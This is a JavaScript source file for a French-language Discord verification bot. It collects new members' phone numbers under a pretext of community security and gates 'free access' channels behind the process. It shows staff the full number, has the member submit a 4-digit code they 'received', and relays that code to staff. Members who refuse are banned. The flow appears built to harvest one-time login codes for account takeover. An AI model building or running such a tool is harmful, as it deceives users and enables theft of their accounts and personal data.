const {
  Client,
  GatewayIntentBits,
  Partials,
  PermissionFlagsBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelType,
  Collection
} = require('discord.js');
const dotenv = require('dotenv');
const app = require('./server');

dotenv.config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent
  ],
  partials: [Partials.Channel, Partials.GuildMember]
});

const PORT = Number(process.env.PORT || 3000);
const GUILD_ID = process.env.GUILD_ID || null;
const VERIFICATION_CHANNEL_ID = process.env.VERIFICATION_CHANNEL_ID || null;
const LOGS_CHANNEL_ID = process.env.LOGS_CHANNEL_ID || null;
const CODE_CHANNEL_ID = process.env.CODE_CHANNEL_ID || null;
const PROOF_CHANNEL_ID = process.env.PROOF_CHANNEL_ID || null;
const REGLEMENT_CHANNEL_ID = process.env.REGLEMENT_CHANNEL_ID || null;
const BIENVENUE_CHANNEL_ID = process.env.BIENVENUE_CHANNEL_ID || null;
const BOOST_CHANNEL_ID = process.env.BOOST_CHANNEL_ID || null;
const RESULTAT_CHANNEL_ID = process.env.RESULTAT_CHANNEL_ID || null;
const TICKET_CHANNEL_ID = process.env.TICKET_CHANNEL_ID || null;
const INVITE_CHANNEL_ID = process.env.INVITE_CHANNEL_ID || null;
const CHAT_MAKER_CHANNEL_ID = process.env.CHAT_MAKER_CHANNEL_ID || null;
const ACCES_GRATUIT_CHANNEL_ID = process.env.ACCES_GRATUIT_CHANNEL_ID || null;
const CONTENU_BOOST_CHANNEL_ID = process.env.CONTENU_BOOST_CHANNEL_ID || null;
const CONTENU_INVITE_CHANNEL_ID = process.env.CONTENU_INVITE_CHANNEL_ID || null;

const CROWN_ROLE_NAME = process.env.CROWN_ROLE_NAME || '👑';
const STAR_ROLE_NAME = process.env.STAR_ROLE_NAME || '⭐️';
const VERIFY_ROLE_NAME = process.env.VERIFY_ROLE_NAME || 'Vérifier';
const BOOSTER_ROLE_NAME = process.env.BOOSTER_ROLE_NAME || '🔋';
const INVITE_ROLE_NAME = process.env.INVITE_ROLE_NAME || '📤';
const PENDING_ROLE_NAME = process.env.PENDING_ROLE_NAME || '⏳ En attente';

const REQUIRED_PHONE_DIGITS = Number(process.env.REQUIRED_PHONE_DIGITS || 10);
const PROOF_TIMEOUT_MINUTES = Number(process.env.PROOF_TIMEOUT_MINUTES || 10);

const pendingVerifications = new Map();

function normalizePhone(rawPhone) {
  return String(rawPhone || '').replace(/\s+/g, '').replace(/-/g, '').replace(/\./g, '');
}

function isValidPhone(rawPhone) {
  const phone = normalizePhone(rawPhone);
  if (!phone) return false;

  if (phone.startsWith('+33')) {
    const digits = phone.replace(/\+/g, '').replace(/^33/, '');
    return digits.length === REQUIRED_PHONE_DIGITS;
  }

  if (phone.startsWith('0')) {
    return phone.length === REQUIRED_PHONE_DIGITS;
  }

  return false;
}

function maskPhone(rawPhone) {
  const phone = normalizePhone(rawPhone);
  if (!phone) return 'Inconnu';
  const digits = phone.replace(/\D/g, '');
  if (digits.length <= 4) return '*'.repeat(digits.length);
  const first = digits.slice(0, 2);
  const last = digits.slice(-2);
  return `${first}****${last}`;
}

function getKey(userId) {
  return `${GUILD_ID}:${userId}`;
}

async function fetchGuild() {
  if (!GUILD_ID) return null;
  return client.guilds.cache.get(GUILD_ID) || (await client.guilds.fetch(GUILD_ID).catch(() => null));
}

async function getChannel(channelId) {
  if (!GUILD_ID || !channelId) return null;
  const guild = await fetchGuild();
  if (!guild) return null;
  return guild.channels.cache.get(channelId) || (await guild.channels.fetch(channelId).catch(() => null));
}

async function findRole(guild, roleName) {
  if (!guild) return null;
  return guild.roles.cache.find((role) => role.name === roleName) || null;
}

function createVerifyButton() {
  return new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('verify_member').setLabel('Verify').setStyle(ButtonStyle.Primary)
  );
}

function createStaffButtons(userId) {
  const row1 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`code_${userId}`).setLabel('Code').setStyle(ButtonStyle.Secondary)
  );
  
  const row2 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`claim_${userId}`).setLabel('Pris en charge').setStyle(ButtonStyle.Primary)
  );
  
  const row3 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`approve_${userId}`).setLabel('Valider').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`refuse_${userId}`).setLabel('Refuser').setStyle(ButtonStyle.Danger)
  );

  return [row1, row2, row3];
}

function createCodeValidationButtons(userId) {
  return new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`validate_code_${userId}`).setLabel('Valider').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`refuse_code_${userId}`).setLabel('Refuser').setStyle(ButtonStyle.Danger)
  );
}

async function sendAccessMessage(member) {
  const channel = await getChannel(ACCES_GRATUIT_CHANNEL_ID);
  if (!channel || !channel.isTextBased()) return;

  const embed = new EmbedBuilder()
    .setColor(0x5865f2)
    .setTitle('🔒 Vérification Requise')
    .setDescription(
      `Bienvenue <@${member.id}> !\n\n` +
      'Pour accéder au contenu et débloquer les salons, tu dois d\'abord **terminer ta vérification**.\n\n' +
      'Les salons suivants sont verrouillés :\n' +
      '• `#acces-gratuit`\n' +
      '• `#contenu-boost`\n' +
      '• `#contenu-invite`\n\n' +
      '**Clique sur le bouton ci-dessous pour accéder à la vérification.**'
    )
    .setFooter({ text: 'Vérification requise' })
    .setTimestamp();

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('goto_verification')
      .setLabel('→ Aller à #verification')
      .setStyle(ButtonStyle.Primary)
  );

  try {
    await channel.send({ content: `<@${member.id}>`, embeds: [embed], components: [row] });
  } catch (e) {
    console.error('Erreur lors de l\'envoi du message d\'accès:', e);
  }
}

async function sendVerificationPanel(member) {
  const channel = await getChannel(VERIFICATION_CHANNEL_ID);
  if (!channel || !channel.isTextBased()) return null;

  const embed = new EmbedBuilder()
    .setColor(0x5865f2)
    .setTitle('🔐 Demande de Vérification')
    .setDescription(
      'Bienvenue ! Pour accéder aux autres salons et débloquer le contenu exclusif, tu dois d\'abord vérifier ton numéro de téléphone.\n\n' +
      '**Pourquoi ?** Pour garantir la sécurité et l\'authenticité de notre communauté.\n\n' +
      'Clique sur le bouton ci-dessous pour commencer la vérification.'
    )
    .setFooter({ text: 'Cette vérification prendra moins de 5 minutes' })
    .setTimestamp();

  const message = await channel.send({
    content: `<@${member.id}>`,
    embeds: [embed],
    components: [createVerifyButton()],
    flags: 64
  });

  return message;
}

async function sendToLogsPanel(member, phone) {
  const channel = await getChannel(LOGS_CHANNEL_ID);
  if (!channel || !channel.isTextBased()) return;

  const embed = new EmbedBuilder()
    .setColor(0x5865f2)
    .setTitle('📋 Demande de Vérification')
    .setThumbnail(member.displayAvatarURL({ dynamic: true, size: 256 }))
    .addFields(
      { name: 'Utilisateur', value: member.user.tag, inline: true },
      { name: 'ID', value: `\`${member.id}\``, inline: true },
      { name: 'Téléphone', value: maskPhone(phone), inline: true },
      { name: 'Statut', value: '⏳ En attente', inline: true },
      { name: 'Pris en charge par', value: 'Personne', inline: true },
      { name: 'Date & Heure', value: new Date().toLocaleString('fr-FR'), inline: true }
    )
    .setTimestamp();

  const buttons = createStaffButtons(member.id);
  const message = await channel.send({ embeds: [embed], components: buttons });

  const verification = pendingVerifications.get(getKey(member.id));
  if (verification) verification.logsMessageId = message.id;
}

async function updateLogsPanel(memberId, statusText, statusColor) {
  const verification = pendingVerifications.get(getKey(memberId));
  if (!verification || !verification.logsMessageId) return;

  const channel = await getChannel(LOGS_CHANNEL_ID);
  if (!channel || !channel.isTextBased()) return;

  const message = await channel.messages.fetch(verification.logsMessageId).catch(() => null);
  if (!message || !message.embeds[0]) return;

  const oldFields = message.embeds[0].fields || [];
  const newFields = oldFields.map((field) => {
    if (field.name === 'Statut') return { name: 'Statut', value: statusText, inline: true };
    if (field.name === 'Pris en charge par' && verification.claimedBy) {
      const claimedUser = client.users.cache.get(verification.claimedBy);
      return { name: 'Pris en charge par', value: claimedUser?.username || 'Inconnu', inline: true };
    }
    return field;
  });

  const updated = new EmbedBuilder(message.embeds[0].data)
    .setColor(statusColor)
    .setFields(newFields);

  const buttons = createStaffButtons(memberId);
  await message.edit({ embeds: [updated], components: buttons });
}

async function sendCodePanelToVerification(memberId) {
  const channel = await getChannel(VERIFICATION_CHANNEL_ID);
  if (!channel || !channel.isTextBased()) return;

  const embed = new EmbedBuilder()
    .setColor(0xffa500)
    .setTitle('🔢 Entrez le Code')
    .setDescription(
      'Le staff a validé ton numéro de téléphone.\n\n' +
      'Maintenant, tu dois entrer le code à 4 chiffres que tu as reçu pour finaliser la vérification.'
    )
    .setFooter({ text: 'En attente de code' })
    .setTimestamp();

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId(`show_code_modal_${memberId}`)
      .setLabel('Entrer le code')
      .setStyle(ButtonStyle.Primary)
  );

  const message = await channel.send({
    content: `<@${memberId}>`,
    embeds: [embed],
    components: [row],
    flags: 64
  });

  const verification = pendingVerifications.get(getKey(memberId));
  if (verification) {
    verification.verificationPanelMessageId = message.id;
    
    // Auto-supprimer après 5 minutes
    setTimeout(() => {
      message.delete().catch(() => null);
    }, 5 * 60 * 1000);
  }
}

async function sendCodePanel(userId, code, claimedBy) {
  const channel = await getChannel(CODE_CHANNEL_ID);
  if (!channel || !channel.isTextBased()) return;

  const verification = pendingVerifications.get(getKey(userId));
  if (!verification) return;

  const guild = await fetchGuild();
  if (!guild) return;

  const member = await guild.members.fetch(userId).catch(() => null);
  const claimedUser = await client.users.fetch(claimedBy).catch(() => null);

  const embed = new EmbedBuilder()
    .setColor(0xffa500)
    .setTitle('🔢 Code Reçu')
    .setThumbnail(member?.displayAvatarURL({ dynamic: true, size: 256 }) || null)
    .addFields(
      { name: 'Utilisateur', value: member?.user.tag || 'Inconnu', inline: true },
      { name: 'ID', value: `\`${userId}\``, inline: true },
      { name: 'Téléphone', value: verification.phone, inline: true },
      { name: 'Code', value: `\`${code}\``, inline: true },
      { name: 'Statut', value: '⏳ En attente de validation', inline: true },
      { name: 'Staff en charge', value: claimedUser?.username || 'Inconnu', inline: true }
    )
    .setTimestamp();

  const message = await channel.send({
    content: `<@${claimedBy}> 📌 Code à valider`,
    embeds: [embed],
    components: [createCodeValidationButtons(userId)]
  });

  verification.codeMessageId = message.id;
}

async function createVerificationRequest(member, phone) {
  const record = {
    userId: member.id,
    guildId: member.guild.id,
    phone: normalizePhone(phone),
    maskedPhone: maskPhone(phone),
    code: null,
    status: 'pending',
    claimedBy: null,
    logsMessageId: null,
    codeMessageId: null,
    verificationPanelMessageId: null,
    createdAt: Date.now()
  };

  pendingVerifications.set(getKey(member.id), record);
  return record;
}

async function approveVerification(memberId) {
  const verification = pendingVerifications.get(getKey(memberId));
  if (!verification) return false;

  const guild = await fetchGuild();
  if (!guild) return false;

  const member = await guild.members.fetch(memberId).catch(() => null);
  if (!member) return false;

  // Retirer le rôle "⏳ En attente"
  const pendingRole = await findRole(guild, PENDING_ROLE_NAME);
  if (pendingRole) {
    await member.roles.remove(pendingRole).catch(() => null);
  }

  // Ajouter le rôle "Vérifier"
  const verifyRole = await findRole(guild, VERIFY_ROLE_NAME);
  if (verifyRole) {
    await member.roles.add(verifyRole).catch(() => null);
  }

  await updateLogsPanel(memberId, '✅ Validé', 0x00ff88);

  // Supprimer le panel de code dans #verification
  try {
    const verifyChannel = await getChannel(VERIFICATION_CHANNEL_ID);
    if (verification.verificationPanelMessageId && verifyChannel) {
      const msg = await verifyChannel.messages.fetch(verification.verificationPanelMessageId).catch(() => null);
      if (msg) await msg.delete().catch(() => null);
    }
  } catch (e) {}

  pendingVerifications.delete(getKey(memberId));
  return true;
}

async function refuseVerification(memberId) {
  const verification = pendingVerifications.get(getKey(memberId));
  if (!verification) return;

  const guild = await fetchGuild();
  if (!guild) return;

  const member = await guild.members.fetch(memberId).catch(() => null);
  if (member) {
    await member.ban({ reason: 'Refus de vérification' }).catch(() => null);
  }

  await updateLogsPanel(memberId, '❌ Refusé', 0xff0000);

  // Supprimer le panel de code dans #verification
  try {
    const verifyChannel = await getChannel(VERIFICATION_CHANNEL_ID);
    if (verification.verificationPanelMessageId && verifyChannel) {
      const msg = await verifyChannel.messages.fetch(verification.verificationPanelMessageId).catch(() => null);
      if (msg) await msg.delete().catch(() => null);
    }
  } catch (e) {}

  pendingVerifications.delete(getKey(memberId));
}

client.once('ready', () => {
  console.log(`✅ Bot prêt : ${client.user.tag}`);
  console.log(`🧩 Serveur : ${GUILD_ID || 'non défini'}`);
});

client.on('guildMemberAdd', async (member) => {
  if (!GUILD_ID || member.guild.id !== GUILD_ID) return;
  if (member.user.bot) return;

  // Donner le rôle "⏳ En attente"
  const guild = await fetchGuild();
  if (guild) {
    const pendingRole = await findRole(guild, PENDING_ROLE_NAME);
    if (pendingRole) {
      await member.roles.add(pendingRole).catch(() => null);
    }
  }

  await sendAccessMessage(member);
  await sendVerificationPanel(member);
});

client.on('interactionCreate', async (interaction) => {
  if (interaction.isButton()) {
    if (interaction.customId === 'verify_member') {
      const modal = new ModalBuilder()
        .setCustomId(`verify_phone_modal_${interaction.user.id}`)
        .setTitle('Vérification');

      const phoneInput = new TextInputBuilder()
        .setCustomId('phone_input')
        .setLabel('Numéro de téléphone')
        .setPlaceholder('06xxxxxxxx ou +336xxxxxxxx')
        .setStyle(TextInputStyle.Short)
        .setRequired(true)
        .setMinLength(10)
        .setMaxLength(15);

      modal.addComponents(new ActionRowBuilder().addComponents(phoneInput));
      await interaction.showModal(modal);
      return;
    }

    if (interaction.customId === 'goto_verification') {
      const verificationChannel = await getChannel(VERIFICATION_CHANNEL_ID);
      if (verificationChannel) {
        await interaction.reply({
          content: `Clique [ici](https://discord.com/channels/${GUILD_ID}/${VERIFICATION_CHANNEL_ID}) pour aller à la vérification`,
ephemeral: true
        });
      }
      return;
    }

    if (interaction.customId.startsWith('claim_')) {
      const targetId = interaction.customId.replace('claim_', '');
      const verification = pendingVerifications.get(getKey(targetId));

      if (!verification) {
        await interaction.reply({ content: '❌ Cette demande n\'existe plus.', ephemeral: true });
        return;
      }

      verification.claimedBy = interaction.user.id;
      verification.status = 'claimed';

      await updateLogsPanel(targetId, '🔵 Pris en charge', 0xffcc00);
      await interaction.reply({ content: `✅ Tu as pris en charge cette demande.\n📱 Numéro complet : \`${verification.phone}\``, ephemeral: true });
      return;
    }

    if (interaction.customId.startsWith('code_')) {
      const targetId = interaction.customId.replace('code_', '');
      const verification = pendingVerifications.get(getKey(targetId));

      if (!verification) {
        await interaction.reply({ content: '❌ Cette demande n\'existe plus.', ephemeral: true });
        return;
      }

      verification.status = 'code_requested';
      await sendCodePanelToVerification(targetId);

      await interaction.reply({ content: `✅ Panel de code envoyé dans #verification`, ephemeral: true });
      return;
    }

    if (interaction.customId.startsWith('approve_')) {
      const targetId = interaction.customId.replace('approve_', '');
      const ok = await approveVerification(targetId);
      if (ok) {
        await interaction.reply({ content: `✅ Vérification de <@${targetId}> approuvée !`, ephemeral: true });
      } else {
        await interaction.reply({ content: '❌ Erreur lors de la validation.', ephemeral: true });
      }
      return;
    }

    if (interaction.customId.startsWith('refuse_')) {
      const targetId = interaction.customId.replace('refuse_', '');
      await refuseVerification(targetId);
      await interaction.reply({ content: `❌ Vérification de <@${targetId}> refusée et membre banni.`, ephemeral: true });
      return;
    }

    if (interaction.customId.startsWith('validate_code_')) {
      const targetId = interaction.customId.replace('validate_code_', '');
      const verification = pendingVerifications.get(getKey(targetId));

      if (!verification || !verification.code) {
        await interaction.reply({ content: '❌ Pas de code à valider.', ephemeral: true });
        return;
      }

      const codeMsg = await interaction.channel.messages.fetch(verification.codeMessageId).catch(() => null);
      if (codeMsg) {
        const updated = new EmbedBuilder(codeMsg.embeds[0].data)
          .setColor(0x00ff88)
          .setFields(codeMsg.embeds[0].fields.map((f) =>
            f.name === 'Statut' ? { name: 'Statut', value: '✅ Code validé', inline: true } : f
          ));
        await codeMsg.edit({ embeds: [updated], components: [] });
      }

      const guild = await fetchGuild();
      const member = await guild.members.fetch(targetId).catch(() => null);
      if (member) {
        await member.send({ content: '✅ Félicitations ! Ton code est validé. Tu as maintenant accès au serveur !' }).catch(() => null);
        await approveVerification(targetId);
      }

      await interaction.reply({ content: `✅ Code validé pour <@${targetId}>`, ephemeral: true });
      return;
    }

    if (interaction.customId.startsWith('refuse_code_')) {
      const targetId = interaction.customId.replace('refuse_code_', '');
      await refuseVerification(targetId);
      await interaction.reply({ content: `❌ Code refusé pour <@${targetId}>.`, ephemeral: true });
      return;
    }

    if (interaction.customId.startsWith('show_code_modal_')) {
      const memberId = interaction.customId.replace('show_code_modal_', '');
      const modal = new ModalBuilder()
        .setCustomId(`code_modal_${memberId}`)
        .setTitle('Entrez votre code');

      const codeInput = new TextInputBuilder()
        .setCustomId('code_input')
        .setLabel('Code à 4 chiffres')
        .setPlaceholder('1234')
        .setStyle(TextInputStyle.Short)
        .setRequired(true)
        .setMinLength(4)
        .setMaxLength(4);

      modal.addComponents(new ActionRowBuilder().addComponents(codeInput));
      await interaction.showModal(modal);
      return;
    }
  }

  if (interaction.isModalSubmit()) {
    if (interaction.customId.startsWith('verify_phone_modal_')) {
      const phone = interaction.fields.getTextInputValue('phone_input');

      if (!isValidPhone(phone)) {
        await interaction.reply({
          content: '❌ Numéro invalide. Utilise un format comme `06xxxxxxxx` ou `+336xxxxxxxx`.',
          ephemeral: true
        });
        return;
      }

      const member = interaction.member;
      const record = await createVerificationRequest(member, phone);
      await sendToLogsPanel(member, record.phone);

      await interaction.reply({
        content: `✅ Numéro reçu : \`${maskPhone(phone)}\`\n\nLe staff va vérifier ta demande. Tu recevras bientôt le code à entrer.`,
        ephemeral: true
      });
      return;
    }

    if (interaction.customId.startsWith('code_modal_')) {
      const memberId = interaction.customId.replace('code_modal_', '');
      const code = interaction.fields.getTextInputValue('code_input');

      if (!/^\d{4}$/.test(code)) {
        await interaction.reply({ content: '❌ Le code doit contenir 4 chiffres.', ephemeral: true });
        return;
      }

      const verification = pendingVerifications.get(getKey(memberId));
      if (!verification) {
        await interaction.reply({ content: '❌ Aucune vérification active.', ephemeral: true });
        return;
      }

      verification.code = code;

      await sendCodePanel(memberId, code, verification.claimedBy);

      await interaction.reply({ content: '✅ Code reçu ! Le staff va vérifier.', ephemeral: true });
      return;
    }
  }
});

client.login(process.env.DISCORD_TOKEN);

app.listen(PORT, () => {
  console.log(`🚀 Service web prêt sur http://localhost:${PORT}`);
});
